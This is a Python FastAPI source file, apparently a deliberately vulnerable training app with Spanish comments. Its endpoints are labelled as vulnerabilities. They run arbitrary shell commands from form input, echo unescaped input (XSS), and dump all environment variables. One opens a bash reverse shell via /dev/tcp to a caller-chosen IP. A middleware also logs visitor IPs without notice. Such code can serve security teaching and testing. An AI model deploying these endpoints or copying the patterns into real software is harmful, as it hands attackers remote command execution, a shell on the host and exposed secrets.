from fastapi import FastAPI, Request, Form, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import subprocess
import os

app = FastAPI()

# Configuración de plantillas HTML
templates = Jinja2Templates(directory="templates")

# Lista para almacenar las direcciones IP
ip_addresses = []

# Middleware para capturar la IP del usuario
@app.middleware("http")
async def capture_ip(request: Request, call_next):
    client_ip = request.client.host  # Obtiene la IP del cliente
    if client_ip not in ip_addresses:
        ip_addresses.append(client_ip)  # Almacena la IP si no está en la lista
    response = await call_next(request)
    return response

# Ruta principal con interfaz visual
@app.get("/", response_class=HTMLResponse)
async def read_root(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

# Ruta para mostrar las IPs registradas
@app.get("/ips", response_class=HTMLResponse)
async def show_ips(request: Request):
    return templates.TemplateResponse("ips.html", {"request": request, "ip_addresses": ip_addresses})

# Vulnerabilidad 1: Inyección de comandos
@app.post("/execute")
async def execute_command(command: str = Form(...)):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return HTMLResponse(content=f"<pre>{result.decode()}</pre>")
    except subprocess.CalledProcessError as e:
        raise HTTPException(status_code=400, detail=f"Error: {e.output.decode()}")

# Vulnerabilidad 2: XSS (Cross-Site Scripting)
@app.post("/xss")
async def xss_vulnerability(input_data: str = Form(...)):
    return HTMLResponse(content=f"<h1>Resultado:</h1><p>{input_data}</p>")

# Vulnerabilidad 3: Exposición de información sensible
@app.get("/info")
async def sensitive_info():
    info = {
        "OS": os.name,
        "Current User": os.getlogin(),
        "Environment Variables": dict(os.environ)
    }
    return info

# Vulnerabilidad 4: Reverse Shell
@app.post("/reverse_shell")
async def reverse_shell(ip: str = Form(...), port: str = Form(...)):
    try:
        command = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        subprocess.run(command, shell=True)
        return {"message": "Reverse shell ejecutado."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# Montar archivos estáticos (opcional)
app.mount("/static", StaticFiles(directory="static"), name="static")